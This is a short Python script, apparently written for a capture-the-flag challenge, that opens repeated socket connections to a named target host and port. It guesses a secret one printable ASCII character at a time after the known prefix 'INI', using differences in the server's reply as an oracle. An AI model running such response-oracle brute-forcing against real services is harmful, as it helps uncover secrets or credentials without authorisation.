#simply bruteforce Ascii fuzzer for 1 char - with hitting the right char we get different output from server and we can continue with next char...
import socket

for i in range(32,127):
    host = "f04-target.allyourbases.co"
    port =  8034                
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(1024)
    print('Received', repr(data))
    push_bytes = b"INI"#this chars we already know
    push_bytes += i.to_bytes(1, byteorder='big', signed=False)
    push_bytes += b"\x0a"
    print("Pushed char: ",push_bytes)

    s.sendall(push_bytes)
    data = s.recv(1024)
    print('Received', repr(data))
    s.close()
